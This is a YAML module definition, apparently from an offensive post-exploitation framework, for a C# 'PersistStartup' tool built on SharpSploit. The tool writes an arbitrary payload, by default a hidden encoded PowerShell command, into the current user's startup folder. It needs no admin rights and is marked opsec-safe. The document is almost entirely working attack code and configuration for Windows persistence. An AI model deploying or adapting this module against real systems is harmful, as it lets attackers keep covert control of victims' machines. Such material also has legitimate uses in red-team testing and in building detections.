name: PersistStartup
authors:
- name: Anthony Rose
  handle: Cx01N
  link: https://twitter.com/Cx01N_
description: |
  Installs a payload into the current users startup folder.
  Payload: Payload to write to a file. E.g. \"powershell -Sta -Nop -Window Hidden -EncodedCommand\ <blah>\".
  FileName: Name of the file to write. E.g. \"startup.bat\".
software: ''
tactics: [TA0003]
techniques: [T1547.001]
background: false
output_extension: ''
needs_admin: false
opsec_safe: true
language: csharp
min_language_version: ''
options:
- name: Payload
  description: Payload to write to a file.
  required: true
  value: powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>
  strict: false
  suggested_values: []
- name: FileName
  description: Name of the file to write.
  required: true
  value: startup.bat
  strict: false
  suggested_values: []
csharp:
  UnsafeCompile: false
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;
    using System.IO;
    using SharpSploit.Persistence;

    public static class Program
    {
        public static void Main(string[] args)
        {
            string payload = args.Length > 0 ? args[0] : "";
            string fileName = args.Length > 1 ? args[1] : "";

            string result = InstallStartupPersistence(payload, fileName);
            Console.WriteLine(result);
        }

        public static string InstallStartupPersistence(string payload, string fileName = "")
        {
            using (StringWriter stringWriter = new StringWriter())
            {
                try
                {
                    if (Startup.InstallStartup(payload, fileName))
                    {
                        stringWriter.WriteLine("Startup Persistence succeeded for: " + fileName);
                    }
                    else
                    {
                        stringWriter.WriteLine("Startup Persistence failed for: " + fileName);
                    }
                }
                catch (Exception e)
                {
                    stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
                }

                return stringWriter.ToString();
            }
        }
    }
